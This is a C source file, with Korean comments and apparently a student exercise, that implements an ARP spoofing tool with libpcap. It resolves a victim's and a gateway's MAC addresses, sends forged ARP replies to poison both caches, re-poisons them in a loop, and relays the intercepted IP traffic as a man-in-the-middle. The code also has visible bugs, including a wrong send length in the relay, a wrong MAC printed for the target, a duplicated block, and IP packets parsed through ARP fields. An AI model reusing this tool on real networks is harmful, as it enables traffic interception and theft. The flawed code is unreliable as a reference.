#include <stdio.h>

#include <string.h>

#include <pcap.h>

#include <net/ethernet.h>

#include <arpa/inet.h>

#include <libnet.h>

#include <sys/socket.h>

#include <sys/ioctl.h>

#include <linux/if.h>

#include <netdb.h>

 

 

 

uint8_t my_mac[6] = {};				/* Attacker (MAC) Address */

uint8_t my_ip[4] = {};				/* Attacker Protocol (IP) Address */

uint8_t target_mac[6] = {};			/* Gateway (MAC) Address */

uint8_t target_ip[4] = {};			/* Gateway Protocol (IP) Address */

uint8_t sender_mac[6] = {};			/* Victim (MAC) Address */

uint8_t sender_ip[4] = {};			/* Victim Protocol (IP) Address */

uint8_t broadcast_mac[6] = { 0xff,0xff,0xff,0xff,0xff,0xff };

uint8_t default_mac[6] = { 0, };

 

struct eth_header {

	uint8_t eth_dmac[6];             /* ether destination (MAC) Address (6 Byte) */

	uint8_t eth_smac[6];             /* ether source (MAC) Address (6 Byte)*/

	u_short eth_type;               /* ether type (2 Byte) */

};

 

struct arp_header {

	u_short arp_hwtype;             /* Hardware Type (2 byte) */

	u_short arp_protype;            /* Protocol Type (2 Byte) */

	uint8_t arp_hlen;                /* Hardware Length (1 Byte) */

	uint8_t arp_plen;                /* Protocol Length (1 Byte) */

	u_short arp_opr;                /* Operation (2 Byte) */

	uint8_t arp_shwaddr[6];          /* Sender Hardware (MAC) Address (6 Byte) */

	uint8_t arp_sipaddr[4];          /* Sender Protocol(IP) Address (4 Byte) */

	uint8_t arp_thwaddr[6];          /* Target Hardware (MAC) Address (6 Byte) */

	uint8_t arp_tproaddr[4];         /* Target Protocol (IP) Address (4 Byte) */

};

 

struct eth_arp {

	eth_header eth;

	arp_header arph;

};

 

struct relay_packet {

	uint8_t dmac[6];             /* destination (MAC) Address (6 Byte) */

	uint8_t smac[6];             /* source (MAC) Address (6 Byte)*/

	u_short pro_type;          /* ether type (2 Byte) */

	uint8_t extra[65546];

};

 

void read_ip(char * ipstr, uint8_t *ip) {

	int i = 0;

	uint8_t temp = 0;

	for (int k = 0;k < 4;k++) {

		temp = 0;

		while (ipstr[i] != '.' && ipstr[i] != 0) {

			temp *= 10;

			temp += (ipstr[i] - 48);

			i++;

		}

		i++;

		printf("%d", temp);

		ip[k] = temp;

	}

}

 

 

int ip_comparison(uint8_t *ip1, uint8_t *ip2) {

	if ((ip1[0] == ip2[0] && ip1[1] == ip2[1] && ip1[2] == ip2[2] && ip1[3] == ip2[3]))

		return 1;

	else

		return 0;

}

 

 

eth_arp make_arp_packet(uint8_t *dmac, uint8_t *smac, u_short operation, uint8_t *sm, uint8_t *si, uint8_t *dm, uint8_t *di) {

	eth_header eth;

	arp_header arph;

	memcpy(eth.eth_dmac, dmac, sizeof(eth.eth_dmac));

	memcpy(eth.eth_smac, smac, sizeof(eth.eth_smac));

	eth.eth_type = htons(ETH_P_ARP);

	arph.arp_hwtype = htons(ARPHRD_ETHER);

	arph.arp_protype = htons(ETH_P_IP);

	arph.arp_hlen = sizeof(eth.eth_dmac);

	arph.arp_plen = sizeof(arph.arp_sipaddr);

	arph.arp_opr = operation;

	memcpy(arph.arp_shwaddr, sm, sizeof(arph.arp_shwaddr));

	memcpy(arph.arp_sipaddr, si, sizeof(arph.arp_sipaddr));

	memcpy(arph.arp_thwaddr, dm, sizeof(arph.arp_thwaddr));

	memcpy(arph.arp_tproaddr, di, sizeof(arph.arp_tproaddr));

	eth_arp arp_packet;

	arp_packet.eth = eth;

	arp_packet.arph = arph;

	return arp_packet;

}

 

 

void get_my_info(char *dev) {

	struct ifreq my_info;

	int sock = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);

	strcpy(my_info.ifr_name, dev);

	ioctl(sock, SIOCGIFHWADDR, &my_info);

	for (int i = 0; i < 6; i++) {

		my_mac[i] = (unsigned char)my_info.ifr_ifru.ifru_hwaddr.sa_data[i];

	}

	ioctl(sock, SIOCGIFADDR, &my_info);

	for (int i = 2; i < 6; ++i) {

		my_ip[i - 2] = (unsigned char)my_info.ifr_ifru.ifru_addr.sa_data[i];

	}

	close(sock);

}

 

 

 

int main(int argc, char* argv[])

 

{

	if (argc != 4)

	{

		printf("syntax: send_arp <interface> <sender ip> <target ip>\n");

		printf("sample: send_arp wlan0 192.168.10.2 192.168.10.1\n");

		return -1;

	}

	read_ip(argv[2], sender_ip);					/* 인자들 읽어들이기 */

	read_ip(argv[3], target_ip);

	char* dev = argv[1];

	char errbuf[PCAP_ERRBUF_SIZE];

	pcap_t *handle;

	get_my_info(dev);								/* 내 mac, ip 주소 얻어오기 */

 

 

													/* sender mac과 target mac을 알아내기 위해 request arp패킷 생성 */

	eth_arp request1 = make_arp_packet(broadcast_mac, my_mac, htons(ARPOP_REQUEST), my_mac, my_ip, default_mac, sender_ip);

	eth_arp request2 = make_arp_packet(broadcast_mac, my_mac, htons(ARPOP_REQUEST), my_mac, my_ip, default_mac, target_ip);

	if (!(handle = pcap_open_live(dev, BUFSIZ, 1, 0, errbuf))) {

		fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);

		return -1;

	}

 

	if (pcap_sendpacket(handle, (const uint8_t*)&request1, (sizeof(request1))) != 0)	/* arp request packet 전송 후 reply packet 캡쳐 */

	{

		printf("pcap_sendpacket error\n");

	}

	else

	{

		printf("arp packet for get sender mac address send\n");

	}

 

	while (true) {

		struct pcap_pkthdr* header;

		const uint8_t* packet;

		int res = pcap_next_ex(handle, &header, &packet);

		if (res == 0) continue;

		if (res == -1 || res == -2) break;

		printf("%u bytes captured\n", header->caplen);

		eth_arp captured_packet;

		memcpy(&captured_packet, packet, sizeof(captured_packet));

		if (captured_packet.eth.eth_type == htons(ETH_P_ARP) && captured_packet.arph.arp_opr == htons(ARPOP_REPLY) && ip_comparison(captured_packet.arph.arp_tproaddr, my_ip))

		{

			memcpy(sender_mac, captured_packet.eth.eth_smac, sizeof(sender_mac));

			printf("cature arp packet that has sender mac address\n");

			printf("sender mac address : %02x:%02x:%02x:%02x:%02x:%02x\n", sender_mac[0], sender_mac[1], sender_mac[2], sender_mac[3], sender_mac[4], sender_mac[5]);

			break;

		}

		if (captured_packet.eth.eth_type == htons(ETH_P_ARP) && captured_packet.arph.arp_opr == htons(ARPOP_REPLY) && ip_comparison(captured_packet.arph.arp_tproaddr, my_ip))

		{

			memcpy(sender_mac, captured_packet.eth.eth_smac, sizeof(sender_mac));

			printf("cature arp packet that has sender mac address\n");

			printf("sender mac address : %02x:%02x:%02x:%02x:%02x:%02x\n", sender_mac[0], sender_mac[1], sender_mac[2], sender_mac[3], sender_mac[4], sender_mac[5]);

			break;

		}

	}

 

	if (pcap_sendpacket(handle, (const uint8_t*)&request2, (sizeof(request2))) != 0)	/* target의 맥주소 알아내기 */

	{

		printf("pcap_sendpacket error\n");

	}

	else

	{

		printf("arp packet for get sender mac address send\n");

	}

 

	while (true) {

		struct pcap_pkthdr* header;

		const uint8_t* packet;

		int res = pcap_next_ex(handle, &header, &packet);

		if (res == 0) continue;

		if (res == -1 || res == -2) break;

		printf("%u bytes captured\n", header->caplen);

		eth_arp captured_packet;

		memcpy(&captured_packet, packet, sizeof(captured_packet));

		if (captured_packet.eth.eth_type == htons(ETH_P_ARP) && captured_packet.arph.arp_opr == htons(ARPOP_REPLY) && ip_comparison(captured_packet.arph.arp_tproaddr, my_ip))

		{

			memcpy(target_mac, captured_packet.eth.eth_smac, sizeof(sender_mac));

			printf("cature arp packet that has sender mac address\n");

			printf("target mac address : %02x:%02x:%02x:%02x:%02x:%02x\n", sender_mac[0], sender_mac[1], sender_mac[2], sender_mac[3], sender_mac[4], sender_mac[5]);

			break;

		}

	}

	/*arp table을 오염시키기 위한 reply 패킷 생성*/

	eth_arp reply1 = make_arp_packet(sender_mac, my_mac, htons(ARPOP_REPLY), my_mac, target_ip, sender_mac, sender_ip);

	eth_arp reply2 = make_arp_packet(target_mac, my_mac, htons(ARPOP_REPLY), my_mac, sender_ip, target_mac, target_ip);

	if (pcap_sendpacket(handle, (const uint8_t*)&reply1, (sizeof(reply1))) != 0)

	{

		printf("pcap_sendpacket error\n");

	}

	else

	{

		printf("arp packet send\n");

	}

	if (pcap_sendpacket(handle, (const uint8_t*)&reply2, (sizeof(reply2))) != 0)

	{

		printf("pcap_sendpacket error\n");

	}

	else

	{

		printf("arp packet send\n");

	}

	int cnt = 0;

	/*relay와 지속적으로 ARP TABLE 감염시키기*/

	while (true) {

		cnt++;

		if (cnt % 10 == 0) {

			if (pcap_sendpacket(handle, (const uint8_t*)&reply1, (sizeof(reply1))) != 0)

			{

				printf("pcap_sendpacket error\n");

			}

			else

			{

				printf("arp packet send\n");

			}

			if (pcap_sendpacket(handle, (const uint8_t*)&reply2, (sizeof(reply2))) != 0)

			{

				printf("pcap_sendpacket error\n");

			}

			else

			{

				printf("arp packet send\n");

			}

		}

		struct pcap_pkthdr* header;

		const uint8_t* packet;

		int res = pcap_next_ex(handle, &header, &packet);

		if (res == 0) continue;

		if (res == -1 || res == -2) break;

		printf("%u bytes captured\n", header->caplen);

		eth_arp captured_packet;

		relay_packet relay;

		memcpy(&captured_packet, packet, sizeof(captured_packet));

		if (captured_packet.eth.eth_type == htons(ETH_P_IP) && ip_comparison(captured_packet.arph.arp_sipaddr, sender_ip))

		{

			memcpy(&relay, packet, header->caplen);

			memcpy(relay.dmac, my_mac, sizeof(my_mac));

			memcpy(relay.smac, target_mac, sizeof(target_mac));

			if (pcap_sendpacket(handle, (const uint8_t*)&relay, (sizeof(header->caplen))) != 0)

				{

				printf("pcap_sendpacket error\n");

			}

			else

			{

				printf("relay packet send\n");

			}

		}

		else if (captured_packet.eth.eth_type == htons(ETH_P_IP) && ip_comparison(captured_packet.arph.arp_tproaddr, sender_ip)) {

			memcpy(&relay, packet, header->caplen);

			memcpy(relay.dmac, sender_mac, sizeof(sender_mac));

			memcpy(relay.smac, my_mac, sizeof(my_mac));

			if (pcap_sendpacket(handle, (const uint8_t*)&relay, (sizeof(header->caplen))) != 0)

			{

				printf("pcap_sendpacket error\n");

			}

			else

			{

				printf("relay packet send\n");

			}

		}

		else if (captured_packet.eth.eth_type == htons(ETH_P_ARP) && captured_packet.arph.arp_opr == htons(ARPOP_REQUEST) && ip_comparison(captured_packet.arph.arp_sipaddr, sender_ip)) {

			if (pcap_sendpacket(handle, (const uint8_t*)&reply1, (sizeof(reply1))) != 0)

			{

				printf("pcap_sendpacket error\n");

			}

			else

			{

				printf("arp packet send\n");

			}

		}

		else if (captured_packet.eth.eth_type == htons(ETH_P_ARP) && captured_packet.arph.arp_opr == htons(ARPOP_REQUEST) && ip_comparison(captured_packet.arph.arp_sipaddr, target_ip) && ip_comparison(captured_packet.arph.arp_tproaddr, sender_ip)) {

			if (pcap_sendpacket(handle, (const uint8_t*)&reply2, (sizeof(reply2))) != 0)

			{

				printf("pcap_sendpacket error\n");

			}

			else

			{

				printf("arp packet send\n");

			}

		}

	}

	return 0;

}

